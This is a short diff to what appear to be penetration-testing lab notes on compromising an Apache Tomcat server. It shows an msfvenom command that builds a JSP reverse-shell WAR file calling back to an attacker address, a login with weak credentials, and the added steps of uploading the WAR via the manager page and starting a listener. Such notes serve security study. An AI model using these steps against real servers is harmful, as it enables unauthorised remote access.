@@ -29,6 +29,9 @@ created msfvenom shell
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.49.102 LPORT=8080 -f war -o revshell_jsp.war
 
 logged into tomcat with lisa lisa 
+uploaded war file on http://192.168.102.101:8080/manager/html/list
+
+start listener on port 8080
 
 
 
